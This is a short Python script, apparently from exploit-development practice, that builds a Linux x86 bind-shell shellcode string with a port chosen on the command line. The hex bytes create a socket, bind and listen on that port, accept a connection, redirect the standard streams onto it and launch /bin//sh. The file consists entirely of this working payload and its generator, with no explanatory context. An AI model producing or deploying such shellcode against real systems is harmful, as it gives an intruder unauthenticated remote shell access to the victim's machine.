#!/usr/bin/python

import sys, socket

input_port = int(sys.argv[1])
#format = socket.htons(input_port)
hex_port = hex(socket.htons(input_port))
first_half = hex_port[2:4]
second_half = hex_port[4:6]
new_port = '\\x' + second_half + '\\x' + first_half
shellcode = "\\x31\\xc0\\xb0\\x66\\x31\\xdb\\xb3\\x01\\x31\\xd2\\x52\\x53\\x6a\\x02\\x31\\xc9\\x89\\xe1\\xcd\\x80\\x89\\xc6\\xb0\\x66\\xb3\\x02\\x52\\x66\\x68" + new_port + "\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x04\\x52\\x56\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x05\\x52\\x52\\x56\\x89\\xe1\\xcd\\x80\\x89\\xc3\\xb0\\x3f\\x31\\xc9\\xcd\\x80\\xb0\\x3f\\x41\\xcd\\x80\\xb0\\x3f\\x41\\xcd\\x80\\xb0\\x0b\\x31\\xdb\\x53\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xcd\\x80"
print(shellcode)
